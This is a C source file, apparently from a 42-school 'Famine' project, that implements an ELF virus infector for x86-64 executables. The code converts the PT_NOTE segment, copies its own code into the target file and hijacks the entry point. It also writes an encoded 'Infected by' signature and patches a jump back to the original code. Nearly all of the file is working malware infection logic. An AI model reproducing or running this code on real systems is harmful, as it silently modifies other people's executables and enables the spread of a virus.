/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
/*   Updated: 2024/11/25 15:31:57 by nguiard          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

static bool		parsing(byte *file, elf_data *data);

#define _START_SIZE	0x45

//	Infects the file located at path
//
//	Returns true on a critical error that needs to stop the whole infection program
bool	infect(profiling *this, const str path) {
	int64_t		fd = 0;
	int64_t		ret = 0;
	struct stat file_stat = {0};
	byte		*file_origin = NULL;
	elf_data	data;
	size_t		signature[5] = {
		0x6465746365666E49,
		0x6562646120796220,
		0x646E6120636D2D6E,
		0x6472616975676E20,
		0x00293B20
	};

	(void)fd;
	(void)ret;
	(void)this;

	open(fd, path, O_RDWR);
	if (fd < 0) {
		printf(FILE_LINE("open failed: %ld\n"), ret);
		return false;
	}

	fstat(ret, fd, &file_stat);
	if (ret) {
		printf(FILE_LINE("fstat failed: %ld\n"), ret);
	}

	if (file_stat.st_size < (long int)sizeof(Elf64_Ehdr))
		goto infect_end;

	mmap(file_origin, NULL, file_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (file_origin == MAP_FAILED) {
		printf(FILE_LINE("fstat failed: %p\n"), file_origin);
		return true;
	}

	data.original_size = file_stat.st_size;
	data.fd = fd;

	// Logic starts
	if (parsing(file_origin, &data) == false) {
		printf("%s is already infected or not compatible\n", path);
		goto infect_end;
	}

	//	Change the PT_NOTE segment
	change_note_segment(this, &data);

	print_data(&data);

	//	Copy the code
	ft_memcpy(data.file + data.infection_offset_file, this->start_rip, this->size);
	
	//	Change the entrypoint
	data.elf->e_entry = data.infection_offset_mem + this->size - _START_SIZE;

	write(ret, 1, &data.elf->e_entry, 4);

	printf("%lx + %lx - %x = %lx (%lx)\n", data.infection_offset_mem, this->size, _START_SIZE, data.elf->e_entry,
		data.infection_offset_mem + this->size - _START_SIZE);

	//	Copy signature
	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, (byte *)signature, 40);
	printf("Written %s at 0x%lx\n", data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET,
		data.infection_offset_file + this->size + SIGNATURE_OFFSET);

	int	new_jump = 0 - (data.infection_offset_mem + this->size) + data.original_entry_point_mem + 12;

	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);

	// Logic ends
	infect_end:
	munmap(ret, data.file, file_stat.st_size);
	close(fd);

	return false;
}

//	Check if the file is compatible for infection and parses the required data
//		in the elf_data *data argument
//
//	Returns true if it's compatible
//	Returns false if it's not
static bool	parsing(byte *file, elf_data *data) {
	Elf64_Phdr	*seg = NULL;

	if (((uint32_t *)file)[0] != 0x464c457f)
		return false;

	if (file[EI_CLASS] != ELFCLASS64 || file[EI_DATA] != ELFDATA2LSB)
		return false;

	if (((Elf64_Ehdr *)file)->e_machine != EM_X86_64 ||
			!(((Elf64_Ehdr *)file)->e_type == ET_EXEC || ((Elf64_Ehdr *)file)->e_type == ET_DYN))
		return false;

	data->file = file;
	data->elf = (Elf64_Ehdr *)file;
	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
	data->original_entry_point_mem = data->elf->e_entry;

	for (size_t i = 0; i < data->elf->e_phnum; i++) {
		seg = &data->segments[i];

		if (seg->p_flags & PF_FAMINE) {
			return false;
		}
	}

	return true;
}

